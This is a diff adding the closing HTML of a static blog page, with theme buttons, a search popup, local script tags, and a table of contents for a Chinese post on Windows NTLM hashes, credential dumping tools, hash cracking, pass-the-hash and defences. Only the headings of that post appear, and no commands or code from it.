+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E8%AE%A4%E8%AF%86Windows-HASH"><span class="nav-number">1.</span> <span class="nav-text">一、认识Windows HASH</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#LM-HASH"><span class="nav-number">1.1.</span> <span class="nav-text">LM HASH</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NTLM-HASH"><span class="nav-number">1.2.</span> <span class="nav-text">NTLM HASH</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NTLM-Hash%E7%9A%84%E7%94%9F%E6%88%90"><span class="nav-number">1.3.</span> <span class="nav-text">NTLM-Hash的生成</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E3%80%81NTML%E7%BD%91%E7%BB%9C%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6"><span class="nav-number">2.</span> <span class="nav-text">二、NTML网络认证机制</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#NTLM-%E5%8D%8F%E8%AE%AE"><span class="nav-number">2.1.</span> <span class="nav-text">NTLM 协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8ENTML%E5%8D%8F%E8%AE%AE%E7%9A%84%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6"><span class="nav-number">2.2.</span> <span class="nav-text">基于NTML协议的身份认证机制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B7%A5%E4%BD%9C%E7%BB%84%E7%8E%AF%E5%A2%83NTML%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B"><span class="nav-number">2.3.</span> <span class="nav-text">工作组环境NTML认证流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%9F%E7%8E%AF%E5%A2%83NTML%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B"><span class="nav-number">2.4.</span> <span class="nav-text">域环境NTML认证流程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E5%A6%82%E4%BD%95%E6%8B%BF%E5%88%B0Hash"><span class="nav-number">3.</span> <span class="nav-text">三、如何拿到Hash?</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E6%9C%AC%E5%9C%B0%E8%8E%B7%E5%8F%96"><span class="nav-number">3.1.</span> <span class="nav-text">1.本地获取</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#QuarksPwDump"><span class="nav-number">3.1.1.</span> <span class="nav-text">QuarksPwDump</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Mimikatz"><span class="nav-number">3.1.2.</span> <span class="nav-text">Mimikatz</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ProDump"><span class="nav-number">3.1.3.</span> <span class="nav-text">ProDump</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Metasploit"><span class="nav-number">3.1.4.</span> <span class="nav-text">Metasploit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cobaltstrike"><span class="nav-number">3.1.5.</span> <span class="nav-text">Cobaltstrike</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E7%BD%91%E7%BB%9C%E6%AC%BA%E9%AA%97"><span class="nav-number">3.2.</span> <span class="nav-text">2.网络欺骗</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Responder"><span class="nav-number">3.2.1.</span> <span class="nav-text">Responder</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7"><span class="nav-number">3.3.</span> <span class="nav-text">3.其他技巧</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Hash%EF%BC%9F"><span class="nav-number">4.</span> <span class="nav-text">四、如何利用Hash？</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E8%A7%A3%E5%AF%86Hash"><span class="nav-number">4.1.</span> <span class="nav-text">1.解密Hash</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%A8%E7%BA%BF%E8%A7%A3%E5%AF%86"><span class="nav-number">4.1.1.</span> <span class="nav-text">在线解密</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E7%A0%B4%E8%A7%A3"><span class="nav-number">4.1.2.</span> <span class="nav-text">本地破解</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#John"><span class="nav-number">4.1.2.1.</span> <span class="nav-text">John</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Hashcat"><span class="nav-number">4.1.2.2.</span> <span class="nav-text">Hashcat</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-Pass-The-Hash"><span class="nav-number">4.2.</span> <span class="nav-text">2.Pass-The-Hash</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#crackmapexec"><span class="nav-number">4.2.1.</span> <span class="nav-text">crackmapexec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Metasploit-1"><span class="nav-number">4.2.2.</span> <span class="nav-text">Metasploit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Mimikatz-1"><span class="nav-number">4.2.3.</span> <span class="nav-text">Mimikatz</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wmiexec-py"><span class="nav-number">4.2.4.</span> <span class="nav-text">wmiexec.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Powershell"><span class="nav-number">4.2.5.</span> <span class="nav-text">Powershell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PTH-EXEC"><span class="nav-number">4.2.6.</span> <span class="nav-text">PTH-EXEC</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%94%E3%80%81%E9%98%B2%E5%BE%A1%E6%80%9D%E8%B7%AF"><span class="nav-number">5.</span> <span class="nav-text">五、防御思路</span></a></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
+</html>
